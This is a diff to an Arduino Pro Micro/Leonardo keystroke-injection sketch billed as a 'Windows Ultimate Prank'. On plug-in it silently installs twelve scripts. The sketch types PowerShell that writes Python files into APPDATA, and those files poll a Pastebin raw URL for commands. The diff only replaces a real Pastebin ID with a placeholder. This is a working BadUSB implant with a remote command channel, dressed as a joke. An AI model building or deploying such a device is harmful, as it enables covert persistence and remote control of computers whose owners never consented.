@@ -1,7 +1,8 @@
 #include <Keyboard.h>
 
 // Arduino Pro Micro / Leonardo — Windows Ultimate Prank
-// Pastebin ID: jL4y1WVJ
+// !! Replace XXXXXXXX in this file with your own Pastebin raw ID before flashing !!
+// See README.md for how to create your Pastebin.
 //
 // HOW IT WORKS:
 //   1. Plug in — all 12 prank scripts are silently installed. Nothing happens yet.
@@ -173,7 +174,7 @@ void setup() {
   typeln("'except:pass' | ac $f");
   typeln("'d=os.environ[''APPDATA'']' | ac $f");
   typeln("'fs=[os.path.join(d,x) for x in [''.j.py'',''.w.py'',''.s.py'',''.n.py'',''.c.py'',''.z.py'',''.k.py'',''.v.py'',''.x.py'',''.p.py'',''.d.py'',''.r.py'']]' | ac $f");
-  typeln("'URL=''https://pastebin.com/raw/jL4y1WVJ''' | ac $f");
+  typeln("'URL=''https://pastebin.com/raw/XXXXXXXX''' | ac $f"); // <-- replace XXXXXXXX with your Pastebin ID
   typeln("'def g():' | ac $f");
   typeln("' try:return urllib.request.urlopen(URL,timeout=5).read().decode()' | ac $f");
   typeln("' except:return ''''  ' | ac $f");
